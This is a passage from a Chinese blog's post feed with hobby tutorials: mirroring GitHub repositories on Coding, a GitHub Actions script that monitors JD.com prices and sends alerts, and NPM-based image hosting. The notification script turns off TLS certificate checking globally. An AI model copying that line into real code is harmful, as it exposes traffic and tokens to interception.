class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> 